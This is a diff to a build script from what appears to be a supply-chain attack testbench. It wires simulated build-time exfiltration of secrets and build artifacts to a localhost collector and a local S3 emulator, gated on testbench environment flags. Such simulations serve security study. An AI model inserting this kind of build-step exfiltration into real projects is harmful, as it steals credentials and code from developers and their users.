@@ -5,6 +5,7 @@
 # It includes malicious code injection
 
 set -e  # Exit on error
+BUILD_DIR="$(cd "$(dirname "$0")" && pwd)"
 
 echo "=========================================="
 echo "🔨 Starting Build Process"
@@ -44,6 +45,11 @@ EOF
   echo "$DATA" | curl -s -X POST http://localhost:3000/collect \
     -H "Content-Type: application/json" \
     -d @- > /dev/null 2>&1 || true
+
+  # Optional: mirror exfil to Floci S3 (SCAS_FLOCI_ENABLED=1 + Floci on :4566)
+  if [ "$SCAS_FLOCI_ENABLED" = "1" ]; then
+    echo "$DATA" | "${BUILD_DIR}/../infrastructure/floci/exfil.sh" secrets || true
+  fi
   
   echo "[TESTBENCH] Build-time data exfiltration simulated"
 fi
@@ -143,4 +149,9 @@ echo "Build artifacts:"
 echo "  - dist/app.js"
 echo "  - dist/manifest.json"
 echo ""
+
+if [ "$TESTBENCH_MODE" = "enabled" ] && [ "$SCAS_FLOCI_ENABLED" = "1" ]; then
+  "${BUILD_DIR}/../infrastructure/floci/exfil.sh" artifacts "${BUILD_DIR}/dist" || true
+fi
+
 
